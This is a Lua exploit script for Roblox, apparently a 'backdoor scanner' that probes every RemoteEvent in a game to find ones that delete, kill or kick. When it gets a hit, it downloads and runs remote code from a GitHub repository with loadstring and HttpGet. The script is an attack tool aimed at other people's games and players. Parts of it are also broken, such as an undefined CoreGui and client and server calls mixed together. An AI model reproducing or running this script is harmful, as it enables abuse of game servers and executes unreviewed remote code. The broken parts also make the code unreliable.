-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Variables
local localPlayer = Players.LocalPlayer
local scanning = false
local timer = 0
local backdoorfound = false
local vulnremote = nil
local safetime = 0.25
local scannedItems = 0

-- Remote setup
local scannerRemote = Instance.new("RemoteEvent")
scannerRemote.Name = "Scanner"
scannerRemote.Parent = ReplicatedStorage

local updateRemote = Instance.new("RemoteEvent")
updateRemote.Name = "ScannerUpdates"
updateRemote.Parent = ReplicatedStorage

-- Create top bar for scanning feedback
local topBar = Instance.new("ScreenGui")
topBar.Name = "GhostScanBar"
topBar.Parent = CoreGui
topBar.ResetOnSpawn = false

local barFrame = Instance.new("Frame")
barFrame.Parent = topBar
barFrame.BackgroundColor3 = Color3.new(0.1, 0.2, 0.1) -- Eerie green-gray
barFrame.BackgroundTransparency = 0.3
barFrame.BorderSizePixel = 0
barFrame.Size = UDim2.new(0, 400, 0, 40)
barFrame.Position = UDim2.new(0.5, -200, 0, 10)
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 6)
corner.Parent = barFrame

local scanLabel = Instance.new("TextLabel")
scanLabel.Parent = barFrame
scanLabel.BackgroundTransparency = 1
scanLabel.Size = UDim2.new(1, 0, 1, 0)
scanLabel.Text = "Searching for backdoors. Please be patient! Scanned: 0 Remotes"
scanLabel.TextColor3 = Color3.new(0.5, 1, 0.5) -- Ghostly green text
scanLabel.TextScaled = true
scanLabel.Font = Enum.Font.SourceSansBold

-- Scanning functions
local function isDeleteBackdoored(remote)
    local function testfire(item)
        pcall(function()
            remote:FireServer(item)
        end)
    end
    local function isDestroyed(obj)
        return obj == nil or obj.Parent == nil
    end
    local testpart = Instance.new("Part", localPlayer:WaitForChild("Backpack"))
    testfire(testpart)
    task.wait(safetime)
    local destroyed = isDestroyed(testpart)
    print("Ghost: Scanning " .. remote:GetFullName() .. " /isbackdoored: " .. tostring(destroyed))
    return destroyed
end

local function isActionRemote(remote, actionType)
    local name = remote.Name:lower()
    if actionType == "kill" and (name:find("kill") or name:find("damage") or name:find("health")) then
        return true
    elseif actionType == "kick" and (name:find("kick") or name:find("ban") or name:find("remove")) then
        return true
    end
    return false
end

local function scan()
    print("Ghost: Starting scan...")
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Parent and v.Parent.Name ~= "RobloxReplicatedStorage" then
            scannedItems = scannedItems + 1
            scanLabel.Text = "Searching for backdoors. Please be patient! Scanned: " .. scannedItems .. " Remotes"
            if isDeleteBackdoored(v) then
                vulnremote = v
                backdoorfound = true
                print("Ghost: Delete backdoor found: " .. v:GetFullName())
                updateRemote:FireAllClients("Backdoor found: " .. v.Name)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/UI.lua"))()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/GhostScanner.lua"))()
                break
            elseif isActionRemote(v, "kill") then
                vulnremote = v
                backdoorfound = true
                print("Ghost: Kill remote found: " .. v:GetFullName())
                updateRemote:FireAllClients("Kill backdoor found: " .. v.Name)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/UI.lua"))()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/GhostScanner.lua"))()
                break
            elseif isActionRemote(v, "kick") then
                vulnremote = v
                backdoorfound = true
                print("Ghost: Kick remote found: " .. v:GetFullName())
                updateRemote:FireAllClients("Kick backdoor found: " .. v.Name)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/UI.lua"))()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/GhostScanner.lua"))()
                break
            end
        end
    end
    if not backdoorfound then
        print("Ghost: No backdoors found, creating remotes...")
        updateRemote:FireAllClients("No backdoors found, using created remotes")
    end
end

-- Scanner control
scannerRemote.OnServerEvent:Connect(function(player, command)
    if player == localPlayer then
        if command == "start" and not scanning then
            scanning = true
            timer = 0
            backdoorfound = false
            vulnremote = nil
            scannedItems = 0
            scanLabel.Text = "Searching for backdoors. Please be patient! Scanned: 0 Remotes"
            coroutine.wrap(function()
                repeat
                    timer += 0.1
                    updateRemote:FireAllClients("Scanning... " .. math.floor((timer / 30) * 100) .. "%")
                    task.wait(0.1)
                until not scanning or timer >= 30 or backdoorfound
                if backdoorfound then
                    updateRemote:FireAllClients("Scan complete: Backdoor found in " .. math.floor(timer * 10) / 10 .. "s")
                elseif timer >= 30 then
                    updateRemote:FireAllClients("Scan complete: No backdoors found")
                end
                topBar:Destroy() -- Clean up top bar after scan
            end)()
            scan()
        elseif command == "stop" and scanning then
            scanning = false
            updateRemote:FireAllClients("Scan stopped")
            topBar:Destroy() -- Clean up top bar if stopped manually
        end
    end
end)
